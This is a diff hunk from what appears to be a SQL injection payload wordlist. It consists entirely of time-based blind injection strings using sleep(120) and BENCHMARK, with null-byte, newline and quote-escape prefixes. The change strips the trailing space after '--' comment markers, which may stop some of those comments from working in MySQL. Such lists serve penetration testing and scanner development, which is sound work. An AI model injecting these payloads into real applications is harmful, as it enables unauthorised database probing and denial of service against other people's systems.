@@ -250,279 +250,279 @@ or sleep(10)='
 ')) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND (('1337' LIKE '1337
 '))) AND 1337=BENCHMARK(5000000,MD5(0x774c5341)) AND ((('1337' LIKE '134')
  and 1337=(select 1337 from (select sleep(120))A)
- and 1337=(select 1337 from (select sleep(120))A) -- 
+ and 1337=(select 1337 from (select sleep(120))A) --
  and sleep(120)
- and sleep(120) -- 
+ and sleep(120) --
  or 1337=(select 1337 from (select sleep(120))A)
- or 1337=(select 1337 from (select sleep(120))A) -- 
+ or 1337=(select 1337 from (select sleep(120))A) --
  or sleep(120)
- or sleep(120) -- 
+ or sleep(120) --
 %00 and 1337=(select 1337 from (select sleep(120))A)
-%00 and 1337=(select 1337 from (select sleep(120))A) -- 
+%00 and 1337=(select 1337 from (select sleep(120))A) --
 %00 and sleep(120)
-%00 and sleep(120) -- 
+%00 and sleep(120) --
 %00 or 1337=(select 1337 from (select sleep(120))A)
-%00 or 1337=(select 1337 from (select sleep(120))A) -- 
+%00 or 1337=(select 1337 from (select sleep(120))A) --
 %00 or sleep(120)
-%00 or sleep(120) -- 
-%00' and 1337=(select 1337 from (select sleep(120))A) -- 
-%00' and sleep(120) -- 
-%00' or 1337=(select 1337 from (select sleep(120))A) -- 
-%00' or sleep(120) -- 
-%00';select sleep(120) -- 
+%00 or sleep(120) --
+%00' and 1337=(select 1337 from (select sleep(120))A) --
+%00' and sleep(120) --
+%00' or 1337=(select 1337 from (select sleep(120))A) --
+%00' or sleep(120) --
+%00';select sleep(120) --
 %00;select sleep(120)
-%00;select sleep(120) -- 
-%00\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%00\' and sleep(120) -- 
-%00\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%00\' or sleep(120) -- 
-%00\';select sleep(120) -- 
-%00\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%00\\' and sleep(120) -- 
-%00\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%00\\' or sleep(120) -- 
-%00\\';select sleep(120) -- 
+%00;select sleep(120) --
+%00\' and 1337=(select 1337 from (select sleep(120))A) --
+%00\' and sleep(120) --
+%00\' or 1337=(select 1337 from (select sleep(120))A) --
+%00\' or sleep(120) --
+%00\';select sleep(120) --
+%00\\' and 1337=(select 1337 from (select sleep(120))A) --
+%00\\' and sleep(120) --
+%00\\' or 1337=(select 1337 from (select sleep(120))A) --
+%00\\' or sleep(120) --
+%00\\';select sleep(120) --
 %00sleep(120)
-%00sleep(120) -- 
+%00sleep(120) --
 %0a and 1337=(select 1337 from (select sleep(120))A)
-%0a and 1337=(select 1337 from (select sleep(120))A) -- 
+%0a and 1337=(select 1337 from (select sleep(120))A) --
 %0a and sleep(120)
-%0a and sleep(120) -- 
+%0a and sleep(120) --
 %0a or 1337=(select 1337 from (select sleep(120))A)
-%0a or 1337=(select 1337 from (select sleep(120))A) -- 
+%0a or 1337=(select 1337 from (select sleep(120))A) --
 %0a or sleep(120)
-%0a or sleep(120) -- 
-%0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0a' and sleep(120) -- 
-%0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0a' or sleep(120) -- 
-%0a';select sleep(120) -- 
+%0a or sleep(120) --
+%0a' and 1337=(select 1337 from (select sleep(120))A) --
+%0a' and sleep(120) --
+%0a' or 1337=(select 1337 from (select sleep(120))A) --
+%0a' or sleep(120) --
+%0a';select sleep(120) --
 %0a;select sleep(120)
-%0a;select sleep(120) -- 
-%0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\' and sleep(120) -- 
-%0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\' or sleep(120) -- 
-%0a\';select sleep(120) -- 
-%0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\\' and sleep(120) -- 
-%0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0a\\' or sleep(120) -- 
-%0a\\';select sleep(120) -- 
+%0a;select sleep(120) --
+%0a\' and 1337=(select 1337 from (select sleep(120))A) --
+%0a\' and sleep(120) --
+%0a\' or 1337=(select 1337 from (select sleep(120))A) --
+%0a\' or sleep(120) --
+%0a\';select sleep(120) --
+%0a\\' and 1337=(select 1337 from (select sleep(120))A) --
+%0a\\' and sleep(120) --
+%0a\\' or 1337=(select 1337 from (select sleep(120))A) --
+%0a\\' or sleep(120) --
+%0a\\';select sleep(120) --
 %0asleep(120)
-%0asleep(120) -- 
+%0asleep(120) --
 %0d%0a and 1337=(select 1337 from (select sleep(120))A)
-%0d%0a and 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a and 1337=(select 1337 from (select sleep(120))A) --
 %0d%0a and sleep(120)
-%0d%0a and sleep(120) -- 
+%0d%0a and sleep(120) --
 %0d%0a or 1337=(select 1337 from (select sleep(120))A)
-%0d%0a or 1337=(select 1337 from (select sleep(120))A) -- 
+%0d%0a or 1337=(select 1337 from (select sleep(120))A) --
 %0d%0a or sleep(120)
-%0d%0a or sleep(120) -- 
-%0d%0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a' and sleep(120) -- 
-%0d%0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a' or sleep(120) -- 
-%0d%0a';select sleep(120) -- 
+%0d%0a or sleep(120) --
+%0d%0a' and 1337=(select 1337 from (select sleep(120))A) --
+%0d%0a' and sleep(120) --
+%0d%0a' or 1337=(select 1337 from (select sleep(120))A) --
+%0d%0a' or sleep(120) --
+%0d%0a';select sleep(120) --
 %0d%0a;select sleep(120)
-%0d%0a;select sleep(120) -- 
-%0d%0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\' and sleep(120) -- 
-%0d%0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\' or sleep(120) -- 
-%0d%0a\';select sleep(120) -- 
-%0d%0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\\' and sleep(120) -- 
-%0d%0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-%0d%0a\\' or sleep(120) -- 
-%0d%0a\\';select sleep(120) -- 
+%0d%0a;select sleep(120) --
+%0d%0a\' and 1337=(select 1337 from (select sleep(120))A) --
+%0d%0a\' and sleep(120) --
+%0d%0a\' or 1337=(select 1337 from (select sleep(120))A) --
+%0d%0a\' or sleep(120) --
+%0d%0a\';select sleep(120) --
+%0d%0a\\' and 1337=(select 1337 from (select sleep(120))A) --
+%0d%0a\\' and sleep(120) --
+%0d%0a\\' or 1337=(select 1337 from (select sleep(120))A) --
+%0d%0a\\' or sleep(120) --
+%0d%0a\\';select sleep(120) --
 %0d%0asleep(120)
-%0d%0asleep(120) -- 
-' and 1337=(select 1337 from (select sleep(120))A) -- 
-' and sleep(120) -- 
-' or 1337=(select 1337 from (select sleep(120))A) -- 
-' or sleep(120) -- 
-';select sleep(120) -- 
+%0d%0asleep(120) --
+' and 1337=(select 1337 from (select sleep(120))A) --
+' and sleep(120) --
+' or 1337=(select 1337 from (select sleep(120))A) --
+' or sleep(120) --
+';select sleep(120) --
 0x00 and 1337=(select 1337 from (select sleep(120))A)
-0x00 and 1337=(select 1337 from (select sleep(120))A) -- 
+0x00 and 1337=(select 1337 from (select sleep(120))A) --
 0x00 and sleep(120)
-0x00 and sleep(120) -- 
+0x00 and sleep(120) --
 0x00 or 1337=(select 1337 from (select sleep(120))A)
-0x00 or 1337=(select 1337 from (select sleep(120))A) -- 
+0x00 or 1337=(select 1337 from (select sleep(120))A) --
 0x00 or sleep(120)
-0x00 or sleep(120) -- 
-0x00' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x00' and sleep(120) -- 
-0x00' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x00' or sleep(120) -- 
-0x00';select sleep(120) -- 
+0x00 or sleep(120) --
+0x00' and 1337=(select 1337 from (select sleep(120))A) --
+0x00' and sleep(120) --
+0x00' or 1337=(select 1337 from (select sleep(120))A) --
+0x00' or sleep(120) --
+0x00';select sleep(120) --
 0x00;select sleep(120)
-0x00;select sleep(120) -- 
-0x00\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\' and sleep(120) -- 
-0x00\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\' or sleep(120) -- 
-0x00\';select sleep(120) -- 
-0x00\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\\' and sleep(120) -- 
-0x00\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x00\\' or sleep(120) -- 
-0x00\\';select sleep(120) -- 
+0x00;select sleep(120) --
+0x00\' and 1337=(select 1337 from (select sleep(120))A) --
+0x00\' and sleep(120) --
+0x00\' or 1337=(select 1337 from (select sleep(120))A) --
+0x00\' or sleep(120) --
+0x00\';select sleep(120) --
+0x00\\' and 1337=(select 1337 from (select sleep(120))A) --
+0x00\\' and sleep(120) --
+0x00\\' or 1337=(select 1337 from (select sleep(120))A) --
+0x00\\' or sleep(120) --
+0x00\\';select sleep(120) --
 0x00sleep(120)
-0x00sleep(120) -- 
+0x00sleep(120) --
 0x0a and 1337=(select 1337 from (select sleep(120))A)
-0x0a and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a and 1337=(select 1337 from (select sleep(120))A) --
 0x0a and sleep(120)
-0x0a and sleep(120) -- 
+0x0a and sleep(120) --
 0x0a or 1337=(select 1337 from (select sleep(120))A)
-0x0a or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0a or 1337=(select 1337 from (select sleep(120))A) --
 0x0a or sleep(120)
-0x0a or sleep(120) -- 
-0x0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a' and sleep(120) -- 
-0x0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a' or sleep(120) -- 
-0x0a';select sleep(120) -- 
+0x0a or sleep(120) --
+0x0a' and 1337=(select 1337 from (select sleep(120))A) --
+0x0a' and sleep(120) --
+0x0a' or 1337=(select 1337 from (select sleep(120))A) --
+0x0a' or sleep(120) --
+0x0a';select sleep(120) --
 0x0a;select sleep(120)
-0x0a;select sleep(120) -- 
-0x0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\' and sleep(120) -- 
-0x0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\' or sleep(120) -- 
-0x0a\';select sleep(120) -- 
-0x0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\\' and sleep(120) -- 
-0x0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0a\\' or sleep(120) -- 
-0x0a\\';select sleep(120) -- 
+0x0a;select sleep(120) --
+0x0a\' and 1337=(select 1337 from (select sleep(120))A) --
+0x0a\' and sleep(120) --
+0x0a\' or 1337=(select 1337 from (select sleep(120))A) --
+0x0a\' or sleep(120) --
+0x0a\';select sleep(120) --
+0x0a\\' and 1337=(select 1337 from (select sleep(120))A) --
+0x0a\\' and sleep(120) --
+0x0a\\' or 1337=(select 1337 from (select sleep(120))A) --
+0x0a\\' or sleep(120) --
+0x0a\\';select sleep(120) --
 0x0asleep(120)
-0x0asleep(120) -- 
+0x0asleep(120) --
 0x0d0a and 1337=(select 1337 from (select sleep(120))A)
-0x0d0a and 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a and 1337=(select 1337 from (select sleep(120))A) --
 0x0d0a and sleep(120)
-0x0d0a and sleep(120) -- 
+0x0d0a and sleep(120) --
 0x0d0a or 1337=(select 1337 from (select sleep(120))A)
-0x0d0a or 1337=(select 1337 from (select sleep(120))A) -- 
+0x0d0a or 1337=(select 1337 from (select sleep(120))A) --
 0x0d0a or sleep(120)
-0x0d0a or sleep(120) -- 
-0x0d0a' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a' and sleep(120) -- 
-0x0d0a' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a' or sleep(120) -- 
-0x0d0a';select sleep(120) -- 
+0x0d0a or sleep(120) --
+0x0d0a' and 1337=(select 1337 from (select sleep(120))A) --
+0x0d0a' and sleep(120) --
+0x0d0a' or 1337=(select 1337 from (select sleep(120))A) --
+0x0d0a' or sleep(120) --
+0x0d0a';select sleep(120) --
 0x0d0a;select sleep(120)
-0x0d0a;select sleep(120) -- 
-0x0d0a\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\' and sleep(120) -- 
-0x0d0a\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\' or sleep(120) -- 
-0x0d0a\';select sleep(120) -- 
-0x0d0a\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\\' and sleep(120) -- 
-0x0d0a\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-0x0d0a\\' or sleep(120) -- 
-0x0d0a\\';select sleep(120) -- 
+0x0d0a;select sleep(120) --
+0x0d0a\' and 1337=(select 1337 from (select sleep(120))A) --
+0x0d0a\' and sleep(120) --
+0x0d0a\' or 1337=(select 1337 from (select sleep(120))A) --
+0x0d0a\' or sleep(120) --
+0x0d0a\';select sleep(120) --
+0x0d0a\\' and 1337=(select 1337 from (select sleep(120))A) --
+0x0d0a\\' and sleep(120) --
+0x0d0a\\' or 1337=(select 1337 from (select sleep(120))A) --
+0x0d0a\\' or sleep(120) --
+0x0d0a\\';select sleep(120) --
 0x0d0asleep(120)
-0x0d0asleep(120) -- 
+0x0d0asleep(120) --
 ;select sleep(120)
-;select sleep(120) -- 
-\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\' and sleep(120) -- 
-\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\' or sleep(120) -- 
-\';select sleep(120) -- 
-\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\' and sleep(120) -- 
-\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\' or sleep(120) -- 
-\\';select sleep(120) -- 
+;select sleep(120) --
+\' and 1337=(select 1337 from (select sleep(120))A) --
+\' and sleep(120) --
+\' or 1337=(select 1337 from (select sleep(120))A) --
+\' or sleep(120) --
+\';select sleep(120) --
+\\' and 1337=(select 1337 from (select sleep(120))A) --
+\\' and sleep(120) --
+\\' or 1337=(select 1337 from (select sleep(120))A) --
+\\' or sleep(120) --
+\\';select sleep(120) --
 \\n and 1337=(select 1337 from (select sleep(120))A)
-\\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\\n and 1337=(select 1337 from (select sleep(120))A) --
 \\n and sleep(120)
-\\n and sleep(120) -- 
+\\n and sleep(120) --
 \\n or 1337=(select 1337 from (select sleep(120))A)
-\\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\\n or 1337=(select 1337 from (select sleep(120))A) --
 \\n or sleep(120)
-\\n or sleep(120) -- 
-\\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\n' and sleep(120) -- 
-\\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\n' or sleep(120) -- 
-\\n';select sleep(120) -- 
+\\n or sleep(120) --
+\\n' and 1337=(select 1337 from (select sleep(120))A) --
+\\n' and sleep(120) --
+\\n' or 1337=(select 1337 from (select sleep(120))A) --
+\\n' or sleep(120) --
+\\n';select sleep(120) --
 \\n;select sleep(120)
-\\n;select sleep(120) -- 
-\\n\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\n\\' and sleep(120) -- 
-\\n\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\n\\' or sleep(120) -- 
-\\n\\';select sleep(120) -- 
+\\n;select sleep(120) --
+\\n\\' and 1337=(select 1337 from (select sleep(120))A) --
+\\n\\' and sleep(120) --
+\\n\\' or 1337=(select 1337 from (select sleep(120))A) --
+\\n\\' or sleep(120) --
+\\n\\';select sleep(120) --
 \\nsleep(120)
-\\nsleep(120) -- 
+\\nsleep(120) --
 \\r\\n and 1337=(select 1337 from (select sleep(120))A)
-\\r\\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n and 1337=(select 1337 from (select sleep(120))A) --
 \\r\\n and sleep(120)
-\\r\\n and sleep(120) -- 
+\\r\\n and sleep(120) --
 \\r\\n or 1337=(select 1337 from (select sleep(120))A)
-\\r\\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\\r\\n or 1337=(select 1337 from (select sleep(120))A) --
 \\r\\n or sleep(120)
-\\r\\n or sleep(120) -- 
-\\r\\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n' and sleep(120) -- 
-\\r\\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n' or sleep(120) -- 
-\\r\\n';select sleep(120) -- 
+\\r\\n or sleep(120) --
+\\r\\n' and 1337=(select 1337 from (select sleep(120))A) --
+\\r\\n' and sleep(120) --
+\\r\\n' or 1337=(select 1337 from (select sleep(120))A) --
+\\r\\n' or sleep(120) --
+\\r\\n';select sleep(120) --
 \\r\\n;select sleep(120)
-\\r\\n;select sleep(120) -- 
-\\r\\n\\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n\\' and sleep(120) -- 
-\\r\\n\\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\\r\\n\\' or sleep(120) -- 
-\\r\\n\\';select sleep(120) -- 
+\\r\\n;select sleep(120) --
+\\r\\n\\' and 1337=(select 1337 from (select sleep(120))A) --
+\\r\\n\\' and sleep(120) --
+\\r\\n\\' or 1337=(select 1337 from (select sleep(120))A) --
+\\r\\n\\' or sleep(120) --
+\\r\\n\\';select sleep(120) --
 \\r\\nsleep(120)
-\\r\\nsleep(120) -- 
+\\r\\nsleep(120) --
 \n and 1337=(select 1337 from (select sleep(120))A)
-\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\n and 1337=(select 1337 from (select sleep(120))A) --
 \n and sleep(120)
-\n and sleep(120) -- 
+\n and sleep(120) --
 \n or 1337=(select 1337 from (select sleep(120))A)
-\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\n or 1337=(select 1337 from (select sleep(120))A) --
 \n or sleep(120)
-\n or sleep(120) -- 
-\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\n' and sleep(120) -- 
-\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\n' or sleep(120) -- 
-\n';select sleep(120) -- 
+\n or sleep(120) --
+\n' and 1337=(select 1337 from (select sleep(120))A) --
+\n' and sleep(120) --
+\n' or 1337=(select 1337 from (select sleep(120))A) --
+\n' or sleep(120) --
+\n';select sleep(120) --
 \n;select sleep(120)
-\n;select sleep(120) -- 
-\n\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\n\' and sleep(120) -- 
-\n\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\n\' or sleep(120) -- 
-\n\';select sleep(120) -- 
+\n;select sleep(120) --
+\n\' and 1337=(select 1337 from (select sleep(120))A) --
+\n\' and sleep(120) --
+\n\' or 1337=(select 1337 from (select sleep(120))A) --
+\n\' or sleep(120) --
+\n\';select sleep(120) --
 \nsleep(120)
-\nsleep(120) -- 
+\nsleep(120) --
 \r\n and 1337=(select 1337 from (select sleep(120))A)
-\r\n and 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n and 1337=(select 1337 from (select sleep(120))A) --
 \r\n and sleep(120)
-\r\n and sleep(120) -- 
+\r\n and sleep(120) --
 \r\n or 1337=(select 1337 from (select sleep(120))A)
-\r\n or 1337=(select 1337 from (select sleep(120))A) -- 
+\r\n or 1337=(select 1337 from (select sleep(120))A) --
 \r\n or sleep(120)
-\r\n or sleep(120) -- 
-\r\n' and 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n' and sleep(120) -- 
-\r\n' or 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n' or sleep(120) -- 
-\r\n';select sleep(120) -- 
+\r\n or sleep(120) --
+\r\n' and 1337=(select 1337 from (select sleep(120))A) --
+\r\n' and sleep(120) --
+\r\n' or 1337=(select 1337 from (select sleep(120))A) --
+\r\n' or sleep(120) --
+\r\n';select sleep(120) --
 \r\n;select sleep(120)
-\r\n;select sleep(120) -- 
-\r\n\' and 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n\' and sleep(120) -- 
-\r\n\' or 1337=(select 1337 from (select sleep(120))A) -- 
-\r\n\' or sleep(120) -- 
-\r\n\';select sleep(120) -- 
+\r\n;select sleep(120) --
+\r\n\' and 1337=(select 1337 from (select sleep(120))A) --
+\r\n\' and sleep(120) --
+\r\n\' or 1337=(select 1337 from (select sleep(120))A) --
+\r\n\' or sleep(120) --
+\r\n\';select sleep(120) --
 \r\nsleep(120)
-\r\nsleep(120) -- 
+\r\nsleep(120) --
 sleep(120)
-sleep(120) -- 
+sleep(120) --
